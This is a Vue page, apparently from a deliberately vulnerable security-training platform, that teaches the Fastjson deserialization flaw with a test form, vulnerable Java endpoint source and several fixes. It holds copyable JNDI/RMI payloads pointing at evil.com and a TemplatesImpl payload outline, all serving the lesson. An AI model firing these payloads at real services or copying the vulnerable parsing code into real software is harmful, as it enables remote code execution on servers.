<template>
  <vuln-template
    title="Fastjson反序列化"
    subtitle="Fastjson Deserialization"
    level="严重"
    :icon="ApiOutlined"
    moduleKey="fastjson"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>Fastjson</strong>是阿里巴巴开发的Java JSON库,其反序列化漏洞是最著名的Java安全问题之一。
      </a-typography-paragraph>
      <a-typography-paragraph>
        Fastjson反序列化漏洞的危害：
      </a-typography-paragraph>
      <ul>
        <li>通过@type字段指定恶意类进行反序列化</li>
        <li>可以远程执行任意代码</li>
        <li>完全控制服务器</li>
        <li>影响范围极广,危害严重</li>
      </ul>
      <a-typography-paragraph>
        漏洞版本：Fastjson &lt;= 1.2.24, 1.2.47等多个版本
      </a-typography-paragraph>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的Fastjson攻击payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">通过RMI远程加载恶意类</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">
        {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["恶意字节码"],...}
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">通过TemplatesImpl加载恶意字节码</span>
      </a-space>

      <a-alert
        message="Fastjson漏洞危害极大,请及时升级到安全版本！"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <div class="json-process-container">
        <a-card title="JSON数据处理服务" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            输入JSON格式的数据，系统将为您解析和处理。
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="JSON数据"
            name="content"
            :rules="[{ required: true, message: '请输入JSON数据' }]"
          >
            <a-textarea
              v-model:value="formState.content" :rows="6"
              size="large"
              placeholder="输入JSON格式的数据，例如：{&quot;name&quot;: &quot;test&quot;, &quot;age&quot;: 20}"
            />
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><api-outlined /></template>
                解析JSON
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #input-hint>
      <a-alert message="测试建议" type="warning" show-icon style="margin-bottom: 12px;" />
      <p><strong>注意：</strong>Fastjson漏洞需要配合gadget链使用，以下是简化测试示例：</p>
      <a-typography-paragraph code copyable style="margin-top: 12px;">
        {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}
      </a-typography-paragraph>
      <p style="color: #95a5a6; margin: 8px 0 0 0; font-size: 13px;">
        实际利用需要配置恶意RMI服务器和生成exploit类
      </p>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/fastjson")
public class FastJson {
    @RequestMapping("")
    public String fastJson(@RequestBody String content) {
        try {
            // 漏洞：直接使用JSON.parseObject()解析用户输入的JSON
            // Fastjson的AutoType功能会自动反序列化@type指定的类
            // 攻击者可以通过@type指定恶意类（如JdbcRowSetImpl）进行RCE
            JSONObject jsonToObject = JSON.parseObject(content);
            return jsonToObject.get("name").toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：Fastjson的AutoType功能会自动反序列化@type指定的类。攻击者可以通过@type指定恶意类（如com.sun.rowset.JdbcRowSetImpl），配合JNDI注入实现远程代码执行。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>升级版本：</strong>升级到Fastjson 1.2.68或更高版本（推荐使用其他JSON库）</li>
        <li><strong>禁用AutoType：</strong>在代码中显式关闭AutoType功能</li>
        <li><strong>使用SafeMode：</strong>Fastjson 1.2.68+版本使用SafeMode模式</li>
        <li><strong>替换JSON库：</strong>建议使用Jackson、Gson等更安全的JSON库</li>
        <li><strong>白名单机制：</strong>如必须使用，配置严格的类白名单</li>
        <li><strong>输入验证：</strong>检查JSON是否包含@type字段</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        JSONObject jsonToObject = JSON.parseObject(content);
// 攻击者可以输入: {"@type":"com.sun.rowset.JdbcRowSetImpl",...}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：禁用AutoType
        import com.alibaba.fastjson.parser.ParserConfig;
        
        @RequestMapping("")
        public String fastJson(@RequestBody String content) {
            // 全局禁用AutoType
            ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
            
            JSONObject jsonToObject = JSON.parseObject(content);
            return jsonToObject.get("name").toString();
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：使用SafeMode（推荐）
        // Fastjson 1.2.68+版本，在JVM启动参数中添加:
        // -Dfastjson.parser.safeMode=true
        
        // 或者在代码中设置
        System.setProperty("fastjson.parser.safeMode", "true");
        
        JSONObject jsonToObject = JSON.parseObject(content);
return jsonToObject.get("name").toString();</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：使用白名单
        import com.alibaba.fastjson.parser.ParserConfig;
        
        @RequestMapping("")
        public String fastJson(@RequestBody String content) {
            ParserConfig config = ParserConfig.getGlobalInstance();
            config.setAutoTypeSupport(false);
            
            // 添加白名单
            config.addAccept("com.example.model.User");
            config.addAccept("com.example.model.Order");
            
            JSONObject jsonToObject = JSON.parseObject(content);
            return jsonToObject.get("name").toString();
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：替换为Jackson（推荐）
        import com.fasterxml.jackson.databind.ObjectMapper;
        
        @RequestMapping("")
        public String fastJson(@RequestBody String content) {
            ObjectMapper mapper = new ObjectMapper();
            // Jackson默认不启用多态类型，更安全
            Map&lt;String, Object&gt; map = mapper.readValue(content, Map.class);
            return map.get("name").toString();
        }
      
        // 最佳方案:替换为Jackson
        ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(json, MyObject.class);</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { ApiOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/home/fastjson")
public class FastJson {
    @RequestMapping("")
    public String fastJson(@RequestBody String content) {
        try {
            // 漏洞：直接使用JSON.parseObject()解析用户输入的JSON
            // Fastjson的AutoType功能会自动反序列化@type指定的类
            // 攻击者可以通过@type指定恶意类（如JdbcRowSetImpl）进行RCE
            JSONObject jsonToObject = JSON.parseObject(content);
            return jsonToObject.get("name").toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
}`

const fixCode1 = `// 错误示例(易受攻击)
JSONObject jsonToObject = JSON.parseObject(content);
// 攻击者可以输入: {"@type":"com.sun.rowset.JdbcRowSetImpl",...}`

const fixCode2 = `// 正确示例1：禁用AutoType
import com.alibaba.fastjson.parser.ParserConfig;

@RequestMapping("")
public String fastJson(@RequestBody String content) {
    // 全局禁用AutoType
    ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
    
    JSONObject jsonToObject = JSON.parseObject(content);
    return jsonToObject.get("name").toString();
}`

const fixCode3 = `// 正确示例2：使用SafeMode（推荐）
// Fastjson 1.2.68+版本，在JVM启动参数中添加:
// -Dfastjson.parser.safeMode=true

// 或者在代码中设置
System.setProperty("fastjson.parser.safeMode", "true");

JSONObject jsonToObject = JSON.parseObject(content);
return jsonToObject.get("name").toString();`

const fixCode4 = `// 正确示例3：使用白名单
import com.alibaba.fastjson.parser.ParserConfig;

@RequestMapping("")
public String fastJson(@RequestBody String content) {
    ParserConfig config = ParserConfig.getGlobalInstance();
    config.setAutoTypeSupport(false);
    
    // 添加白名单
    config.addAccept("com.example.model.User");
    config.addAccept("com.example.model.Order");
    
    JSONObject jsonToObject = JSON.parseObject(content);
    return jsonToObject.get("name").toString();
}`

const fixCode5 = `// 正确示例4：替换为Jackson（推荐）
import com.fasterxml.jackson.databind.ObjectMapper;

@RequestMapping("")
public String fastJson(@RequestBody String content) {
    ObjectMapper mapper = new ObjectMapper();
    // Jackson默认不启用多态类型，更安全
    Map<String, Object> map = mapper.readValue(content, Map.class);
    return map.get("name").toString();
}

// 最佳方案:替换为Jackson
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(json, MyObject.class);`

const formState = reactive({
  content: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/fastjson', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
}
</script>
